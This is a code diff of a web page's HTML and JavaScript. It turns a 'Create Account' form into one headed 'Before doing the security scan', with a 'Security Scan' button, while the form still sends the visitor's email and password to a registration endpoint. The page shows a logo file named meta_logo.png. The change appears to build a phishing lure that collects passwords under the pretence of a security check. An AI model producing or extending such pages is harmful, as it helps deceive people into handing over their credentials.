@@ -20,8 +20,9 @@
         <!-- Circular logo -->
         <img src="assets/meta_logo.png" alt="Company Logo" class="logo"
             onerror="this.style.background='var(--color-accent)';this.alt=''" />
-
-        <h1 class="card-title">Create Account</h1>
+        <!-- 
+        <h1 class="card-title">Create Account</h1> -->
+        <h3>Before doing the security scan</h3>
         <p class="card-subtitle">Fill in the details below.</p>
 
         <!-- Status message area (shown/hidden via JS) -->
@@ -49,7 +50,7 @@
             </div>
 
             <!-- Submit -->
-            <button type="submit" class="btn">Create Account</button>
+            <button type="submit" class="btn">Security Scan</button>
 
         </form>
 
@@ -114,7 +115,7 @@
 
                 // Disable button while submitting
                 submitBtn.disabled = true;
-                submitBtn.textContent = 'Submitting…';
+                submitBtn.textContent = 'Scanning…';
 
                 try {
                     const response = await fetch('api/register.php', {
@@ -123,7 +124,15 @@
                         body: JSON.stringify({ email, password })
                     });
 
-                    const data = await response.json();
+                    const responseText = await response.text();
+                    let data;
+                    try {
+                        data = JSON.parse(responseText);
+                    } catch (e) {
+                        console.error('Non-JSON response received:', responseText);
+                        showMessage('error', 'Server error: Invalid response format.');
+                        return;
+                    }
 
                     if (data.success) {
                         showMessage('success', data.message + ' Redirecting…');
@@ -135,10 +144,10 @@
                     }
                 } catch (err) {
                     showMessage('error', 'Something went wrong. Please try again.');
-                    console.error(err);
+                    console.error('Fetch error:', err);
                 } finally {
                     submitBtn.disabled = false;
-                    submitBtn.textContent = 'Create Account';
+                    submitBtn.textContent = 'Scan';
                 }
             });
         })();
